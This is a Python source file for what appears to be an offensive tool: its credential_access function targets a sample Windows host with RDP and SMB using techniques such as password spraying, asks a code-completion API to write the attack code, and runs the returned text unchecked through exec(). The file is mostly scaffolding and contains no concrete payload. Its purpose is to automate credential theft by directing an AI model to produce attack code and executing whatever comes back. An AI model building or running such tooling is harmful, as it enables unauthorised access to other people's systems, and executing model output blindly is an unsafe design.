import json
import requests
from utils.constants import API_KEY, USER_ACTIVITY_LOGS
from utils.helpers import log_activity, generate_ai_prompt
from data.credential_access_techniques import CREDENTIAL_ACCESS_TECHNIQUES

def credential_access(target_system, access_vector):
    """
    Attempt to gain credentials using various access techniques.
    :param target_system: Information about the target system.
    :param access_vector: The technique to be used for credential access.
    :return: Result of the credential access attempt.
    """
    log_activity(USER_ACTIVITY_LOGS, f"Initiating credential access on {target_system} using {access_vector}")
    
    # Check if the access vector is valid
    if access_vector not in CREDENTIAL_ACCESS_TECHNIQUES:
        log_activity(USER_ACTIVITY_LOGS, f"Invalid access vector: {access_vector}")
        return {"status": "error", "message": "Invalid access vector"}

    # Generate AI prompt for the selected credential access technique
    ai_prompt = generate_ai_prompt(access_vector)
    response = requests.post(
        "https://api.openai.com/v1/engines/davinci-codex/completions",
        headers={"Authorization": f"Bearer {API_KEY}"},
        json={"prompt": ai_prompt, "max_tokens": 150}
    )

    if response.status_code == 200:
        # Execute the AI-suggested code snippet dynamically
        exec(response.json()['choices'][0]['text'])
        result = locals().get('result', {})
        log_activity(USER_ACTIVITY_LOGS, f"Credential access result: {result}")
        return result
    else:
        log_activity(USER_ACTIVITY_LOGS, f"AI API call failed with status code: {response.status_code}")
        return {"status": "error", "message": "AI API call failed"}

def main():
    # Example usage
    target_info = {
        "ip": "192.168.1.100",
        "os": "Windows",
        "services": ["RDP", "SMB"]
    }
    access_vector = "password_spraying"
    result = credential_access(target_info, access_vector)
    print(result)

if __name__ == "__main__":
    main()